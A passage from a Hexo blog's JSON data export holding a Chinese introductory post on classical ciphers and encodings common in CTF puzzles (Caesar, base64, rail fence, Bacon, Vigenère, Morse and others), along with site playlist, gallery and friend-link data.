ER\n\n先取出第一个字母：TEESCPE\n\n再取出第二个字母：HRIAIHR\n\n连在一起就是：TEESCPEHRIAIHR\n\n还原为所需密码。\n\n而解密的时候，我们先把密文从中间分开，变为两行：\n\nT E E S C P E\n\nH R I A I H R\n\n再按上下上下的顺序组合起来：\n\nTHEREISACIPHER\n\n分出空格，就可以得到原文了：\n\nTHERE IS A CIPHER\n\n \n\n明文：THERE IS A CIPHER\n\n七个一组：THEREIS ACIPHER\n\n抽取字母：TA HC EI RP EH IE SR\n\n组合得到密码：TAHCEIRPEHIESR\n\n那么这时候就无法再按照2栏的方法来解了…\n\n*1**分析解码*这样，我们可以通过分析密码的字母数来解出密码…\n\n比如：TAHCEIRPEHIESR\n\n一共有14个字母，可能是2栏或者7栏…\n\n尝试2栏…失败\n\n尝试7栏…成功\n\n \n\n## **9.培根密码**：\n\n**特征：010101010101**\n\n培根所用的密码是一种本质上用二进制数设计的，没有用通常的0和1来表示，而是采用a和b。\n\n第一种方式\n\nA aaaaa B aaaab C aaaba D aaabb E aabaa\n\nF aabab G aabba H aabbb I abaaa J abaab\n\nK ababa L ababb M abbaa N abbab O abbba\n\nP abbbb Q baaaa R baaab S baaba T baabb\n\nU babaa V babab W babba X babbb Y bbaaa\n\nZ bbaab\n\n \n\n第二种方式\n\na AAAAA g AABBA n ABBAA t BAABA\n\nb AAAAB h AABBB o ABBAB u-v BAABB\n\nc AAABA i-j ABAAA p ABBBA w BABAA\n\nd AAABB k ABAAB q ABBBB x BABAB\n\ne AABAA l ABABA r BAAAA y BABBA\n\nf AABAB m ABABB s BAAAB z BABBB\n\n \n\n## 10.**维吉尼亚密码**：\n\n人们在单一[恺撒密码](http://baike.baidu.com/item/恺撒密码)的基础上扩展出多表密码，维吉尼亚密码引入了“[密钥](http://baike.baidu.com/item/密钥)”的概念，即根据密钥来决定用哪一行的密表来进行替换，以此来对抗字频统计。\n\n密码表：\n\nA B C D E F G H I J K L M N O P Q R S T U V W X Y Z\n\nA -A B C D E F G H I J K L M N O P Q R S T U V W X Y Z\n\nB -B C D E F G H I J K L M N O P Q R S T U V W X Y Z A\n\nC -C D E F G H I J K L M N O P Q R S T U V W X Y Z A B\n\nD -D E F G H I J K L M N O P Q R S T U V W X Y Z A B C\n\nE -E F G H I J K L M N O P Q R S T U V W X Y Z A B C D\n\nF -F G H I J K L M N O P Q R S T U V W X Y Z A B C D E\n\nG -G H I J K L M N O P Q R S T U V W X Y Z A B C D E F\n\nH -H I J K L M N O P Q R S T U V W X Y Z A B C D E F G\n\nI -I J K L M N O P Q R S T U V W X Y Z A B C D E F G H\n\nJ -J K L M N O P Q R S T U V W X Y Z A B C D E F G H I\n\nK -K L M N O P Q R S T U V W X Y Z A B C D E F G H I J\n\nL -L M N O P Q R S T U V W X Y Z A B C D E F G H I J K\n\nM -M N O P Q R S T U V W X Y Z A B C D E F G H I J K L\n\nN -N O P Q R S T U V W X Y Z A B C D E F G H I J K L M\n\nO -O P Q R S T U V W X Y Z A B C D E F G H I J K L M N\n\nP -P Q R S T U V W X Y Z A B C D E F G H I J K L M N O\n\nQ -Q R S T U V W X Y Z A B C D E F G H I J K L M N O P\n\nR -R S T U V W X Y Z A B C D E F G H I J K L M N O P Q\n\nS -S T U V W X Y Z A B C D E F G H I J K L M N O P Q R\n\nT -T U V W X Y Z A B C D E F G H I J K L M N O P Q R S\n\nU -U V W X Y Z A B C D E F G H I J K L M N O P Q R S T\n\nV -V W X Y Z A B C D E F G H I J K L M N O P Q R S T U\n\nW -W X Y Z A B C D E F G H I J K L M N O P Q R S T U V\n\nX -X Y Z A B C D E F G H I J K L M N O P Q R S T U V W\n\nY -Y Z A B C D E F G H I J K L M N O P Q R S T U V W X\n\nZ -Z A B C D E F G H I J K L M N O P Q R S T U V W X Y\n\n当选定RELATIONS作为密钥时，加密过程是：明文一个字母为T，第一个密钥字母为R，因此可以找到在R行中代替T的为K，依此类推，得出对应关系如下：\n\n密钥:RELAT IONSR ELATI ONSRE LATIO NSREL\n\n明文:TOBEO RNOTT OBETH ATIST HEQUE STION\n\n密文:KSMEH ZBBLK SMEMP OGAJX SEJCS FLZSY\n\n \n\n## 11.**猪圈密码**\n\n遇到了就自行百度密码表\n\n \n\n## 12.**rabbit**加密：\n\n特征：有U2Fsd开头\n\n \n\n## 13.**utf-7**\n\nUTF-7 (7-位元 Unicode 转换格式（Unicode Transformation Format，简写成 UTF）) 是一种可变长度字元编码方式，用以将 Unicode 字元以 ASCII 编码的字元串来呈现，可以应用在[电子邮件](http://baike.baidu.com/item/电子邮件)传输之类的应用。\n\n \n\n## 14.**波利比奥斯方阵密码**\n\n棋盘密码是利用波利比奥斯方阵(Polybius Square)进行加密的密码方式，产生于公元前两世纪的希腊，相传是世界上最早的一种密码。\n\n简单的来说就是把字母排列好，用坐标的形式表现出来。字母是密文，明文便是字母的坐标。\n\n### 排列法1：\n\n[![img](http://www.lsablog.com/wp-content/uploads/2017/04/Picture1.png)\n\n### 排列法2：\n\n![img](http://www.lsablog.com/wp-content/uploads/2017/04/Picture2.png).\n\n \n\n## 15.摩斯密码：\n\n它的代码包括五种： 点、划、点和划之间的停顿、每个字符间短的停顿（在点和划之间）、每个词之间中等的停顿以及句子之间长的停顿。\n\n密码表：\n\nA . _ M _ _ Y _ . _ _\n B _ . . . N _ . Z _ _ . .\n C _ . _ . O _ _ _ 1 . _ _ _ _\n D _ . . P . _ _ . 2 . . _ _ _\n E . Q _ _ . _ 3 . . . _ _\n F . . _ . R . _ . 4 . . . . _\n G _ _ . S . . . 5 . . . . .\n H . . . . T _ 6 _ . . . .\n I . . U . . _ 7 _ _ . . .\n J . _ _ _ V . . . _ 8 _ _ _ . .\n K _ . _ W . _ _ 9 _ _ _ _ .\n L . _ . . X _ . . _ 0 _ _ _ _ _\n\n \n\n1 =- – – – ？ ==- -==\n 2 ==- – – / -==-=\n 3 ===- – （ ) -=- -=-\n 4 ====- – -====-\n 5 ===== 。 =-=-=-\n 6 -====\n 7 – -===\n 8 – – -==\n 9 – – – -=\n 0 – – – – –\n\n \n\n## 16.**当铺密码：**\n\n就是一种将中文和[数字](http://baike.baidu.com/item/数字/6204)进行转化的[密码](http://baike.baidu.com/item/密码/65553)，[算法](http://baike.baidu.com/item/算法)相当简单:当前汉字有多少笔画出头，就是转化成数字几。\n\n王夫 井工 夫口 由中人 井中 夫夫 由中大：67 84 70 123 82 77 125","slug":"2020-10-01-ctf常见加密","published":1,"updated":"2020-11-20T02:13:45.701Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckkntx9jc000cxov76n79946s","content":"<p>[toc]</p>\n<h1 id=\"CTF中常见的加密\"><a href=\"#CTF中常见的加密\" class=\"headerlink\" title=\"CTF中常见的加密\"></a>CTF中常见的加密</h1><h2 id=\"1-凯撒密码\"><a href=\"#1-凯撒密码\" class=\"headerlink\" title=\"1.凯撒密码\"></a><strong>1.凯撒密码</strong></h2><p>通过把字母移动一定的位数来实现加密和解密。明文中的所有字母都在字母表上向后（或向前）按照一个固定数目进行偏移后被替换成密文。只需简单地统计字频就可以破译</p>\n<p><strong>经典的凯撒加密算法是移动3位</strong></p>\n<h2 id=\"2-base64\"><a href=\"#2-base64\" class=\"headerlink\" title=\"2.base64\"></a>2.<strong>base64</strong></h2><p>是网络上最常见的用于传输8Bit<a href=\"http://baike.baidu.com/item/字节代码\" target=\"_blank\" rel=\"noopener\">字节代码</a>的编码方式之一</p>\n<p><strong>特征：Base64就是用下列总计64个字符：</strong></p>\n<p><strong>A-Z a-z 0-9 + /</strong></p>\n<p>Base64字符串的长度必然<strong>是4的整数倍</strong></p>\n<p>Base64很多都是以=或==结尾的。但是注意，也存在不以=或==结尾的Base64，只要编码的二进制字节数恰好被3给整除。</p>\n<h2 id=\"3-rot13\"><a href=\"#3-rot13\" class=\"headerlink\" title=\"3.rot13\"></a>3.<strong>rot13</strong></h2><p>ROT13（回转13位，rotateby13places，有时中间加了个减号称作ROT-13）是一种简易的置换暗码。它是一种在网路论坛用作隐藏八卦、妙句、谜题解答以及某些脏话的工具，目的是逃过版主或管理员的匆匆一瞥。</p>\n<p><strong>特征：再rot13加密一次得到明文</strong></p>\n<p>套用ROT13到一段文字上仅仅只需要检查字元字母顺序并取代它在13位之后的对应字母，有需要超过时则重新绕回26英文字母开头即可[2]。A换成N、B换成O、依此类推到M换成Z，然后序列反转：N换成A、O换成B、最后Z换成M。</p>\n<h2 id=\"4-md5\"><a href=\"#4-md5\" class=\"headerlink\" title=\"4.md5\"></a>4.<strong>md5</strong></h2><p>MD5以512位分组来处理输入文本，每一分组又划分为16个32位子分组。算法的输出由四个32位分组组成，将它们级联形成一个128位散列值。</p>\n<h2 id=\"5-sha1\"><a href=\"#5-sha1\" class=\"headerlink\" title=\"5.sha1\"></a>5.<strong>sha1</strong></h2><p>对于长度小于2^64位的消息，SHA1会产生一个160位的消息摘要</p>\n<h2 id=\"6-crc32\"><a href=\"#6-crc32\" class=\"headerlink\" title=\"6.crc32\"></a>6.<strong>crc32</strong></h2><p>在诸多检错手段中，CRC是最著名的一种。CRC的全称是循环冗余校验。</p>\n<p><strong>特征：CRC32的计算结果只有8位</strong></p>\n<h2 id=\"7-Uuencode\"><a href=\"#7-Uuencode\" class=\"headerlink\" title=\"7.Uuencode\"></a><strong>7.Uuencode</strong></h2><p>uuencode是将二进制文件转换为文本文件的过程，转换后的文件可以通过纯文本e-mail进行传输，在接收方对该文件进行uudecode，即将其转换为初始的二进制文件。</p>\n<p><strong>特征：每行都是以M开头</strong></p>\n<p> 编码算法为不断地用3个字节数据列成一组(不足3个字节以零补齐)然后 此24位数据分为4 组,每组6位,再将得到的6位二进制数映射到ASCII码32~95之间的字符,而每行以M 开头(表示32+45),60个字符一行(包括”M”),最后一行以32+N 的ASCII字符开头,N 为最后一行编码的输入字节数.编码以一个只含一个空格的一行和只含”end”的一行结束.</p>\n<h2 id=\"8-栅栏密码\"><a href=\"#8-栅栏密码\" class=\"headerlink\" title=\"8.栅栏密码\"></a>8.<strong>栅栏密码</strong></h2><p>就是把要加密的明文分成N个一组，然后把每组的第1个字连起来，形成一段无规律的话。 不过栅栏密码本身有一个潜规则，就是组成栅栏的字母一般不会太多。</p>\n<p>一般比较常见的是2栏的栅栏密码。</p>\n<p>比如<a href=\"http://baike.baidu.com/item/明文\" target=\"_blank\" rel=\"noopener\">明文</a>：THERE IS A CIPHER</p>\n<p>去掉空格后变为：THEREISACIPHER</p>\n<p>两个一组，得到：TH ER EI SA CI PH ER</p>\n<p>先取出第一个字母：TEESCPE</p>\n<p>再取出第二个字母：HRIAIHR</p>\n<p>连在一起就是：TEESCPEHRIAIHR</p>\n<p>还原为所需密码。</p>\n<p>而解密的时候，我们先把密文从中间分开，变为两行：</p>\n<p>T E E S C P E</p>\n<p>H R I A I H R</p>\n<p>再按上下上下的顺序组合起来：</p>\n<p>THEREISACIPHER</p>\n<p>分出空格，就可以得到原文了：</p>\n<p>THERE IS A CIPHER</p>\n<p>明文：THERE IS A CIPHER</p>\n<p>七个一组：THEREIS ACIPHER</p>\n<p>抽取字母：TA HC EI RP EH IE SR</p>\n<p>组合得到密码：TAHCEIRPEHIESR</p>\n<p>那么这时候就无法再按照2栏的方法来解了…</p>\n<p><em>1*</em>分析解码*这样，我们可以通过分析密码的字母数来解出密码…</p>\n<p>比如：TAHCEIRPEHIESR</p>\n<p>一共有14个字母，可能是2栏或者7栏…</p>\n<p>尝试2栏…失败</p>\n<p>尝试7栏…成功</p>\n<h2 id=\"9-培根密码：\"><a href=\"#9-培根密码：\" class=\"headerlink\" title=\"9.培根密码：\"></a><strong>9.培根密码</strong>：</h2><p><strong>特征：010101010101</strong></p>\n<p>培根所用的密码是一种本质上用二进制数设计的，没有用通常的0和1来表示，而是采用a和b。</p>\n<p>第一种方式</p>\n<p>A aaaaa B aaaab C aaaba D aaabb E aabaa</p>\n<p>F aabab G aabba H aabbb I abaaa J abaab</p>\n<p>K ababa L ababb M abbaa N abbab O abbba</p>\n<p>P abbbb Q baaaa R baaab S baaba T baabb</p>\n<p>U babaa V babab W babba X babbb Y bbaaa</p>\n<p>Z bbaab</p>\n<p>第二种方式</p>\n<p>a AAAAA g AABBA n ABBAA t BAABA</p>\n<p>b AAAAB h AABBB o ABBAB u-v BAABB</p>\n<p>c AAABA i-j ABAAA p ABBBA w BABAA</p>\n<p>d AAABB k ABAAB q ABBBB x BABAB</p>\n<p>e AABAA l ABABA r BAAAA y BABBA</p>\n<p>f AABAB m ABABB s BAAAB z BABBB</p>\n<h2 id=\"10-维吉尼亚密码：\"><a href=\"#10-维吉尼亚密码：\" class=\"headerlink\" title=\"10.维吉尼亚密码：\"></a>10.<strong>维吉尼亚密码</strong>：</h2><p>人们在单一<a href=\"http://baike.baidu.com/item/恺撒密码\" target=\"_blank\" rel=\"noopener\">恺撒密码</a>的基础上扩展出多表密码，维吉尼亚密码引入了“<a href=\"http://baike.baidu.com/item/密钥\" target=\"_blank\" rel=\"noopener\">密钥</a>”的概念，即根据密钥来决定用哪一行的密表来进行替换，以此来对抗字频统计。</p>\n<p>密码表：</p>\n<p>A B C D E F G H I J K L M N O P Q R S T U V W X Y Z</p>\n<p>A -A B C D E F G H I J K L M N O P Q R S T U V W X Y Z</p>\n<p>B -B C D E F G H I J K L M N O P Q R S T U V W X Y Z A</p>\n<p>C -C D E F G H I J K L M N O P Q R S T U V W X Y Z A B</p>\n<p>D -D E F G H I J K L M N O P Q R S T U V W X Y Z A B C</p>\n<p>E -E F G H I J K L M N O P Q R S T U V W X Y Z A B C D</p>\n<p>F -F G H I J K L M N O P Q R S T U V W X Y Z A B C D E</p>\n<p>G -G H I J K L M N O P Q R S T U V W X Y Z A B C D E F</p>\n<p>H -H I J K L M N O P Q R S T U V W X Y Z A B C D E F G</p>\n<p>I -I J K L M N O P Q R S T U V W X Y Z A B C D E F G H</p>\n<p>J -J K L M N O P Q R S T U V W X Y Z A B C D E F G H I</p>\n<p>K -K L M N O P Q R S T U V W X Y Z A B C D E F G H I J</p>\n<p>L -L M N O P Q R S T U V W X Y Z A B C D E F G H I J K</p>\n<p>M -M N O P Q R S T U V W X Y Z A B C D E F G H I J K L</p>\n<p>N -N O P Q R S T U V W X Y Z A B C D E F G H I J K L M</p>\n<p>O -O P Q R S T U V W X Y Z A B C D E F G H I J K L M N</p>\n<p>P -P Q R S T U V W X Y Z A B C D E F G H I J K L M N O</p>\n<p>Q -Q R S T U V W X Y Z A B C D E F G H I J K L M N O P</p>\n<p>R -R S T U V W X Y Z A B C D E F G H I J K L M N O P Q</p>\n<p>S -S T U V W X Y Z A B C D E F G H I J K L M N O P Q R</p>\n<p>T -T U V W X Y Z A B C D E F G H I J K L M N O P Q R S</p>\n<p>U -U V W X Y Z A B C D E F G H I J K L M N O P Q R S T</p>\n<p>V -V W X Y Z A B C D E F G H I J K L M N O P Q R S T U</p>\n<p>W -W X Y Z A B C D E F G H I J K L M N O P Q R S T U V</p>\n<p>X -X Y Z A B C D E F G H I J K L M N O P Q R S T U V W</p>\n<p>Y -Y Z A B C D E F G H I J K L M N O P Q R S T U V W X</p>\n<p>Z -Z A B C D E F G H I J K L M N O P Q R S T U V W X Y</p>\n<p>当选定RELATIONS作为密钥时，加密过程是：明文一个字母为T，第一个密钥字母为R，因此可以找到在R行中代替T的为K，依此类推，得出对应关系如下：</p>\n<p>密钥:RELAT IONSR ELATI ONSRE LATIO NSREL</p>\n<p>明文:TOBEO RNOTT OBETH ATIST HEQUE STION</p>\n<p>密文:KSMEH ZBBLK SMEMP OGAJX SEJCS FLZSY</p>\n<h2 id=\"11-猪圈密码\"><a href=\"#11-猪圈密码\" class=\"headerlink\" title=\"11.猪圈密码\"></a>11.<strong>猪圈密码</strong></h2><p>遇到了就自行百度密码表</p>\n<h2 id=\"12-rabbit加密：\"><a href=\"#12-rabbit加密：\" class=\"headerlink\" title=\"12.rabbit加密：\"></a>12.<strong>rabbit</strong>加密：</h2><p>特征：有U2Fsd开头</p>\n<h2 id=\"13-utf-7\"><a href=\"#13-utf-7\" class=\"headerlink\" title=\"13.utf-7\"></a>13.<strong>utf-7</strong></h2><p>UTF-7 (7-位元 Unicode 转换格式（Unicode Transformation Format，简写成 UTF）) 是一种可变长度字元编码方式，用以将 Unicode 字元以 ASCII 编码的字元串来呈现，可以应用在<a href=\"http://baike.baidu.com/item/电子邮件\" target=\"_blank\" rel=\"noopener\">电子邮件</a>传输之类的应用。</p>\n<h2 id=\"14-波利比奥斯方阵密码\"><a href=\"#14-波利比奥斯方阵密码\" class=\"headerlink\" title=\"14.波利比奥斯方阵密码\"></a>14.<strong>波利比奥斯方阵密码</strong></h2><p>棋盘密码是利用波利比奥斯方阵(Polybius Square)进行加密的密码方式，产生于公元前两世纪的希腊，相传是世界上最早的一种密码。</p>\n<p>简单的来说就是把字母排列好，用坐标的形式表现出来。字母是密文，明文便是字母的坐标。</p>\n<h3 id=\"排列法1：\"><a href=\"#排列法1：\" class=\"headerlink\" title=\"排列法1：\"></a>排列法1：</h3><p>[<img src=\"http://www.lsablog.com/wp-content/uploads/2017/04/Picture1.png\" alt=\"img\"></p>\n<h3 id=\"排列法2：\"><a href=\"#排列法2：\" class=\"headerlink\" title=\"排列法2：\"></a>排列法2：</h3><p><img src=\"http://www.lsablog.com/wp-content/uploads/2017/04/Picture2.png\" alt=\"img\">.</p>\n<h2 id=\"15-摩斯密码：\"><a href=\"#15-摩斯密码：\" class=\"headerlink\" title=\"15.摩斯密码：\"></a>15.摩斯密码：</h2><p>它的代码包括五种： 点、划、点和划之间的停顿、每个字符间短的停顿（在点和划之间）、每个词之间中等的停顿以及句子之间长的停顿。</p>\n<p>密码表：</p>\n<p>A . _ M _ _ Y _ . _ _<br> B _ . . . N _ . Z _ _ . .<br> C _ . _ . O _ _ _ 1 . _ _ _ _<br> D _ . . P . _ _ . 2 . . _ _ _<br> E . Q _ _ . _ 3 . . . _ _<br> F . . _ . R . _ . 4 . . . . _<br> G _ _ . S . . . 5 . . . . .<br> H . . . . T _ 6 _ . . . .<br> I . . U . . _ 7 _ _ . . .<br> J . _ _ _ V . . . _ 8 _ _ _ . .<br> K _ . _ W . _ _ 9 _ _ _ _ .<br> L . _ . . X _ . . _ 0 _ _ _ _ _</p>\n<p>1 =- – – – ？ ==- -==<br> 2 ==- – – / -==-=<br> 3 ===- – （ ) -=- -=-<br> 4 ====- – -====-<br> 5 ===== 。 =-=-=-<br> 6 -====<br> 7 – -===<br> 8 – – -==<br> 9 – – – -=<br> 0 – – – – –</p>\n<h2 id=\"16-当铺密码：\"><a href=\"#16-当铺密码：\" class=\"headerlink\" title=\"16.当铺密码：\"></a>16.<strong>当铺密码：</strong></h2><p>就是一种将中文和<a href=\"http://baike.baidu.com/item/数字/6204\" target=\"_blank\" rel=\"noopener\">数字</a>进行转化的<a href=\"http://baike.baidu.com/item/密码/65553\" target=\"_blank\" rel=\"noopener\">密码</a>，<a href=\"http://baike.baidu.com/item/算法\" target=\"_blank\" rel=\"noopener\">算法</a>相当简单:当前汉字有多少笔画出头，就是转化成数字几。</p>\n<p>王夫 井工 夫口 由中人 井中 夫夫 由中大：67 84 70 123 82 77 125</p>\n<script>\n        document.querySelectorAll('.github-emoji')\n          .forEach(el => {\n            if (!el.dataset.src) { return; }\n            const img = document.createElement('img');\n            img.style = 'display:none !important;';\n            img.src = el.dataset.src;\n            img.addEventListener('error', () => {\n              img.remove();\n              el.style.color = 'inherit';\n              el.style.backgroundImage = 'none';\n              el.style.background = 'none';\n            });\n            img.addEventListener('load', () => {\n              img.remove();\n            });\n            document.body.appendChild(img);\n          });\n      </script>","site":{"data":{"musics":[{"name":"故梦","artist":"双笙","url":"http://music.163.com/song/media/outer/url?id=409654891.mp3","cover":"http://p2.music.126.net/GZJY3Iz7TacxI3pr4jvQYQ==/18007801439911769.jpg?param=130y130"},{"name":"这个世界不会好","artist":"子默","url":"http://music.163.com/song/media/outer/url?id=571464961.mp3","cover":"http://p1.music.126.net/nzsUiw0881szTUdrgi5G1g==/109951165044907847.jpg?param=130y130"},{"name":"Beautiful World","artist":"Westlife","url":"http://music.163.com/song/media/outer/url?id=20707408.mp3","cover":"https://p2.music.126.net/MEWr-THANcYy-1jvx334_Q==/109951163167214019.jpg?param=130y130"},{"name":"River Flows in You","artist":"Yiruma","url":"http://music.163.com/song/media/outer/url?id=26237342.mp3","cover":"https://p2.music.126.net/8ZRSyI0ZN_4ah8uzsNd1mA==/2324367581169008.jpg?param=130y130"},{"name":"Hello My Love","artist":"Westlife","url":"http://music.163.com/song/media/outer/url?id=1338728670.mp3","cover":"https://p2.music.126.net/P2_COhPmlhsOpoj31DDLeA==/109951163785867445.jpg?param=130y130"},{"name":"If I Let You Go","artist":"Westlife","url":"http://music.163.com/song/media/outer/url?id=27220254.mp3","cover":"https://p2.music.126.net/TcOOoZSbISGT9AkhUtwOsg==/5644892697128237.jpg?param=130y130"},{"name":"Señorita","artist":"Shawn Mendes/Camila Cabello","url":"http://music.163.com/song/media/outer/url?id=1373168742.mp3","cover":"https://p2.music.126.net/eSrLKe5g3U8jX-lb629q6A==/109951164162885535.jpg?param=130y130"}],"galleries":[{"name":"背景图片3","cover":"背景图片/bg_pic_107.jpg","description":"背景图片","photos":["背景图片/bg_pic_101.jpg","背景图片/bg_pic_102.jpg","背景图片/bg_pic_103.jpg","背景图片/bg_pic_104.jpg","背景图片/bg_pic_105.jpg","背景图片/bg_pic_106.jpg","背景图片/bg_pic_107.jpg","背景图片/bg_pic_108.jpg","背景图片/bg_pic_109.jpg","背景图片/bg_pic_110.jpg","背景图片/bg_pic_111.jpg","背景图片/bg_pic_112.jpg","背景图片/bg_pic_113.jpg"]},{"name":"背景图片4","cover":"背景图片/bg_pic_130.jpg","description":"背景图片","photos":["背景图片/bg_pic_151.jpg","背景图片/bg_pic_152.jpg","背景图片/bg_pic_153.jpg","背景图片/bg_pic_154.jpg","背景图片/bg_pic_155.jpg","背景图片/bg_pic_156.jpg","背景图片/bg_pic_157.jpg","背景图片/bg_pic_158.jpg","背景图片/bg_pic_159.jpg","背景图片/bg_pic_160.jpg","背景图片/bg_pic_161.jpg","背景图片/bg_pic_162.jpg","背景图片/bg_pic_163.jpg","背景图片/bg_pic_164.jpg","背景图片/bg_pic_165.jpg"]}],"friends":[{"name":"Liloong3tの博客","introduction":"CTFer","url":"http://liloong3t.com","title":"去看看","avatar":"/favicon.png"},{"name":"wust-ais","url":"https://wust-ais.github.io/","title":"访问主页","introduction":"武汉科技大学信安协会欢迎您的加入！","avatar":"/medias/avatars/wust-ais.png"},{"name":"Blinkfox","url":"https://blinkfox.github.io","title":"前去学习","introduction":"闪烁之狐大佬做的hexo主题很棒，人也很好！","avatar":"https://blinkfox.github.io/medias/avatar.jpg"}]}},"excerpt":"","more":"<p>[toc]</p>\n<h1 id=\"CTF中常见的加密\"><a href=\"#CTF中常见的加密\" class=\"headerlink\" title=\"CTF中常见的加密\"></a>CTF中常见的加密</h1><h2 id=\"1-凯撒密码\"><a href=\"#1-凯撒密码\" class=\"headerlink\" title=\"1.凯撒密码\"></a><strong>1.凯撒密码</strong></h2><p>通过把字母移动一定的位数来实现加密和解密。明文中的所有字母都在字母表上向后（或向前）按照一个固定数目进行偏移后被替换成密文。只需简单地统计字频就可以破译</p>\n<p><strong>经典的凯撒加密算法是移动3位</strong></p>\n<h2 id=\"2-base64\"><a href=\"#2-base64\" class=\"headerlink\" title=\"2.base64\"></a>2.<strong>base64</strong></h2><p>是网络上最常见的用于传输8Bit<a href=\"http://baike.baidu.com/item/字节代码\" target=\"_blank\" rel=\"noopener\">字节代码</a>的编码方式之一</p>\n<p><strong>特征：Base64就是用下列总计64个字符：</strong></p>\n<p><strong>A-Z a-z 0-9 + /</strong></p>\n<p>Base64字符串的长度必然<strong>是4的整数倍</strong></p>\n<p>Base64很多都是以=或==结尾的。但是注意，也存在不以=或==结尾的Base64，只要编码的二进制字节数恰好被3给整除。</p>\n<h2 id=\"3-rot13\"><a href=\"#3-rot13\" class=\"headerlink\" title=\"3.rot13\"></a>3.<strong>rot13</strong></h2><p>ROT13（回转13位，rotateby13places，有时中间加了个减号称作ROT-13）是一种简易的置换暗码。它是一种在网路论坛用作隐藏八卦、妙句、谜题解答以及某些脏话的工具，目的是逃过版主或管理员的匆匆一瞥。</p>\n<p><strong>特征：再rot13加密一次得到明文</strong></p>\n<p>套用ROT13到一段文字上仅仅只需要检查字元字母顺序并取代它在13位之后的对应字母，有需要超过时则重新绕回26英文字母开头即可[2]。A换成N、B换成O、依此类推到M换成Z，然后序列反转：N换成A、O换成B、最后Z换成M。</p>\n<h2 id=\"4-md5\"><a href=\"#4-md5\" class=\"headerlink\" title=\"4.md5\"></a>4.<strong>md5</strong></h2><p>MD5以512位分组来处理输入文本，每一分组又划分为16个32位子分组。算法的输出由四个32位分组组成，将它们级联形成一个128位散列值。</p>\n<h2 id=\"5-sha1\"><a href=\"#5-sha1\" class=\"headerlink\" title=\"5.sha1\"></a>5.<strong>sha1</strong></h2><p>对于长度小于2^64位的消息，SHA1会产生一个160位的消息摘要</p>\n<h2 id=\"6-crc32\"><a href=\"#6-crc32\" class=\"headerlink\" title=\"6.crc32\"></a>6.<strong>crc32</strong></h2><p>在诸多检错手段中，CRC是最著名的一种。CRC的全称是循环冗余校验。</p>\n<p><strong>特征：CRC32的计算结果只有8位</strong></p>\n<h2 id=\"7-Uuencode\"><a href=\"#7-Uuencode\" class=\"headerlink\" title=\"7.Uuencode\"></a><strong>7.Uuencode</strong></h2><p>uuencode是将二进制文件转换为文本文件的过程，转换后的文件可以通过纯文本e-mail进行传输，在接收方对该文件进行uudecode，即将其转换为初始的二进制文件。</p>\n<p><strong>特征：每行都是以M开头</strong></p>\n<p> 编码算法为不断地用3个字节数据列成一组(不足3个字节以零补齐)然后 此24位数据分为4 组,每组6位,再将得到的6位二进制数映射到ASCII码32~95之间的字符,而每行以M 开头(表示32+45),60个字符一行(包括”M”),最后一行以32+N 的ASCII字符开头,N 为最后一行编码的输入字节数.编码以一个只含一个空格的一行和只含”end”的一行结束.</p>\n<h2 id=\"8-栅栏密码\"><a href=\"#8-栅栏密码\" class=\"headerlink\" title=\"8.栅栏密码\"></a>8.<strong>栅栏密码</strong></h2><p>就是把要加密的明文分成N个一组，然后把每组的第1个字连起来，形成一段无规律的话。 不过栅栏密码本身有一个潜规则，就是组成栅栏的字母一般不会太多。</p>\n<p>一般比较常见的是2栏的栅栏密码。</p>\n<p>比如<a href=\"http://baike.baidu.com/item/明文\" target=\"_blank\" rel=\"noopener\">明文</a>：THERE IS A CIPHER</p>\n<p>去掉空格后变为：THEREISACIPHER</p>\n<p>两个一组，得到：TH ER EI SA CI PH ER</p>\n<p>先取出第一个字母：TEESCPE</p>\n<p>再取出第二个字母：HRIAIHR</p>\n<p>连在一起就是：TEESCPEHRIAIHR</p>\n<p>还原为所需密码。</p>\n<p>而解密的时候，我们先把密文从中间分开，变为两行：</p>\n<p>T E E S C P E</p>\n<p>H R I A I H R</p>\n<p>再按上下上下的顺序组合起来：</p>\n<p>THEREISACIPHER</p>\n<p>分出空格，就可以得到原文了：</p>\n<p>THERE IS A CIPHER</p>\n<p>明文：THERE IS A CIPHER</p>\n<p>七个一组：THEREIS ACIPHER</p>\n<p>抽取字母：TA HC EI RP EH IE SR</p>\n<p>组合得到密码：TAHCEIRPEHIESR</p>\n<p>那么这时候就无法再按照2栏的方法来解了…</p>\n<p><em>1*</em>分析解码*这样，我们可以通过分析密码的字母数来解出密码…</p>\n<p>比如：TAHCEIRPEHIESR</p>\n<p>一共有14个字母，可能是2栏或者7栏…</p>\n<p>尝试2栏…失败</p>\n<p>尝试7栏…成功</p>\n<h2 id=\"9-培根密码：\"><a href=\"#9-培根密码：\" class=\"headerlink\" title=\"9.培根密码：\"></a><strong>9.培根密码</strong>：</h2><p><strong>特征：010101010101</strong></p>\n<p>培根所用的密码是一种本质上用二进制数设计的，没有用通常的0和1来表示，而是采用a和b。</p>\n<p>第一种方式</p>\n<p>A aaaaa B aaaab C aaaba D aaabb E aabaa</p>\n<p>F aabab G aabba H aabbb I abaaa J abaab</p>\n<p>K ababa L ababb M abbaa N abbab O abbba</p>\n<p>P abbbb Q baaaa R baaab S baaba T baabb</p>\n<p>U babaa V babab W babba X babbb Y bbaaa</p>\n<p>Z bbaab</p>\n<p>第二种方式</p>\n<p>a AAAAA g AABBA n ABBAA t BAABA</p>\n<p>b AAAAB h AABBB o ABBAB u-v BAABB</p>\n<p>c AAABA i-j ABAAA p ABBBA w BABAA</p>\n<p>d AAABB k ABAAB q ABBBB x BABAB</p>\n<p>e AABAA l ABABA r BAAAA y BABBA</p>\n<p>f AABAB m ABABB s BAAAB z BABBB</p>\n<h2 id=\"10-维吉尼亚密码：\"><a href=\"#10-维吉尼亚密码：\" class=\"headerlink\" title=\"10.维吉尼亚密码：\"></a>10.<strong>维吉尼亚密码</strong>：</h2><p>人们在单一<a href=\"http://baike.baidu.com/item/恺撒密码\" target=\"_blank\" rel=\"noopener\">恺撒密码</a>的基础上扩展出多表密码，维吉尼亚密码引入了“<a href=\"http://baike.baidu.com/item/密钥\" target=\"_blank\" rel=\"noopener\">密钥</a>”的概念，即根据密钥来决定用哪一行的密表来进行替换，以此来对抗字频统计。</p>\n<p>密码表：</p>\n<p>A B C D E F G H I J K L M N O P Q R S T U V W X Y Z</p>\n<p>A -A B C D E F G H I J K L M N O P Q R S T U V W X Y Z</p>\n<p>B -B C D E F G H I J K L M N O P Q R S T U V W X Y Z A</p>\n<p>C -C D E F G H I J K L M N O P Q R S T U V W X Y Z A B</p>\n<p>D -D E F G H I J K L M N O P Q R S T U V W X Y Z A B C</p>\n<p>E -E 